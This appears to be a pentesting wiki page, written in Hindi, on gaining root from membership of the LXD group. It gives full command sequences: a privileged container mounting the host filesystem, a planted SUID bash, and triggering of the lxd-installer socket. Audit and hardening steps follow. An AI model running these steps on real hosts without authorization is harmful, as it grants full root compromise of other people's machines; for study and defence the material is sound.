# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Host के LXD management group (आमतौर पर _**lxd**_) की सदस्यता daemon पर पूरा नियंत्रण देकर root तक पहुँचने का रास्ता प्रदान कर सकती है।<sup>[[1]](#references)</sup> यह वही trust-boundary समस्या है जिसका वर्णन [runtime control sockets](../../containers-namespaces/container-security/runtime-api-and-daemon-exposure.md) और [writable host mounts](../../containers-namespaces/container-security/sensitive-host-mounts.md) के लिए किया गया है: management API तक पहुँच पर्याप्त हो सकती है, भले ही मौजूदा process पहले से किसी container के अंदर न हो।<sup>[[1]](#references)</sup>

## Ubuntu `lxd-installer` socket activation

सिर्फ इसलिए यह न मानें कि `lxd` की सदस्यता हानिरहित है क्योंकि LXD snap मौजूद नहीं है। Ubuntu Server 24.04 और उसके बाद के संस्करणों में, पहले से शामिल `lxd-installer` package `/run/lxd-installer.socket` को `root:lxd` और mode `0660` के साथ उपलब्ध कराता है। इससे connection `lxd-installer@.service` को root के रूप में सक्रिय करता है, जो sudo password या polkit authorization के बिना LXD snap install करता है; कुछ wrapper versions में standard input TTY न होने पर confirmation prompt भी नहीं दिखता।<sup>[[10]](#references)[[11]](#references)</sup>

Account membership और socket-activated service—दोनों की जाँच करें:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
id -nG
getent group lxd
stat -c '%A %U:%G %n' /run/lxd-installer.socket
systemctl cat lxd-installer.socket lxd-installer@.service
```

एक अधिकृत `lxd`-group test, सामान्य `lxc` wrapper के ज़रिए या सीधे socket से connect करके installer को activate कर सकता है। दूसरा तरीका दिखाता है कि वास्तविक authorization boundary Unix-socket ACL है, न कि wrapper prompt:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/lxd-installer.socket"); s.send(b"x"); s.recv(1)'
lxc version
```

जब daemon उपलब्ध हो जाए, तो नीचे दी गई privileged-container techniques जारी रखें।<sup>[[10]](#references)[[11]](#references)</sup>

## इंटरनेट के बिना Exploiting

### विधि 1

आप LXD के साथ इस्तेमाल करने के लिए किसी विश्वसनीय repository से Alpine image डाउनलोड कर सकते हैं।
Canonical का LXD image server रोज़ाना builds प्रकाशित करता है: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
नए build (directory का नाम तारीख है) से **lxd.tar.xz** और **rootfs.squashfs**, दोनों डाउनलोड करें।<sup>[[8]](#references)</sup>

वैकल्पिक रूप से, [project instructions](https://github.com/lxc/distrobuilder) का पालन करके अपनी मशीन पर distrobuilder install कर सकते हैं।<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage    

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```

**incus.tar.xz** (**lxd.tar.xz** अगर आपने Canonical image server से डाउनलोड किया है) और **rootfs.squashfs** अपलोड करें, फिर image import करके container बनाएं।<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

> [!CAUTION]
> अगर आपको यह error मिले _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** चलाएँ, एक default storage pool सेट अप करें, फिर commands के पिछले chunk को **दोहराएँ**।<sup>[[2]](#references)</sup>

अंत में, container शुरू करें और host filesystem पर root shell खोलें:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

क्योंकि इस privileged instance में UID 0 को remap नहीं किया गया है, इसलिए यह mounted host root के ज़रिए host-owned SUID payload बना सकता है। इससे operator को container shell में छोड़े बिना container-to-host pivot पूरा हो जाता है:<sup>[[10]](#references)[[11]](#references)</sup>

```bash
# From the host, write the payload through the privileged container
lxc exec privesc -- /bin/sh -c 'cp /mnt/root/bin/bash /mnt/root/rootbash && chmod 4755 /mnt/root/rootbash'

# Execute on the host; -p prevents bash from dropping the SUID-derived EUID
/rootbash -p
id
```

Payload को ऐसे filesystem पर रखें जो SUID को सपोर्ट करता हो। अलग `/tmp` आमतौर पर `nosuid` के साथ mount होता है और host `/` के non-recursive bind के अंतर्गत दिखाई नहीं दे सकता, इसलिए इस proof के लिए host root filesystem पर `/rootbash` जैसा path अधिक विश्वसनीय है।<sup>[[10]](#references)[[11]](#references)</sup>

### विधि 2

Alpine image बनाएं और उसे `security.privileged=true` flag के साथ शुरू करें, जो container root को host root पर map करता है; `/` को mount करने से container के अंदर host filesystem तक पहुंच मिलती है।<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

## Host-wide AppArmor का प्रभाव

LXD snap शुरू करने से `/run/sysctl.d/zz-lxd.conf` भी लिखा जा सकता है और `kernel.apparmor_restrict_unprivileged_userns` तथा `kernel.apparmor_restrict_unprivileged_unconfined` दोनों को `0` पर सेट किया जा सकता है। इससे हर स्थानीय user के लिए Ubuntu की unprivileged-user-namespace संबंधी पाबंदियाँ कमज़ोर हो जाती हैं, इसलिए host का आकलन करते समय LXD सक्रिय करने से पहले और बाद के मान दर्ज करें।<sup>[[10]](#references)[[11]](#references)</sup>

```bash
cat /run/sysctl.d/zz-lxd.conf 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns \
       kernel.apparmor_restrict_unprivileged_unconfined
```

## Audit और hardening

`lxd` membership को root grant मानें। अनावश्यक member को हटाने का असर नए login sessions पर होता है; `lxd-installer` को purge करने या उसके socket को mask करने से केवल on-demand installation path हटता है और यह उस user पर कोई रोक **नहीं** लगाता जो पहले से installed LXD daemon तक पहुँच सकता है।<sup>[[10]](#references)[[11]](#references)</sup>

```bash
getent group lxd
sudo gpasswd -d <user> lxd

# Only if on-demand LXD installation is not required
sudo systemctl mask --now lxd-installer.socket
# or: sudo apt purge lxd-installer
```

समझौते के उपयोगी संकेतों में `security.privileged=true` वाले LXD instances, ऐसे disk devices जिनका `source` `/` हो, `/run/lxd-installer.socket` से अप्रत्याशित connections, नई SUID files, और ऊपर दिए गए AppArmor sysctls का `1` से `0` में बदलना शामिल है।<sup>[[10]](#references)[[11]](#references)</sup>

```bash
lxc list
lxc config show <instance> --expanded
find / -xdev -type f -perm -4000 2>/dev/null
```

## References

- [1] [LXD के लिए सुरक्षा को harden कैसे करें](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD containers और virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Images को copy और import कैसे करें](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [distrobuilder से images कैसे बनाएँ](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image की परिभाषा](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image server](https://images.lxd.canonical.com/)
- [9] [प्रकार: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
- [10] [STAR Labs की LXD group privilege-escalation रिपोर्ट और PoC](https://github.com/star-sg/lxd-group-privesc-report)
- [11] [पुरानी शराब, नई बोतल में: एक दशक पुराने LXD Group Root को फिर से हथियारबंद करना](https://starlabs.sg/blog/2026/06-old-wine-in-a-new-bottle-a-decade-old-lxd-group-root-re-armed)
{{#include ../../../banners/hacktricks-training.md}}
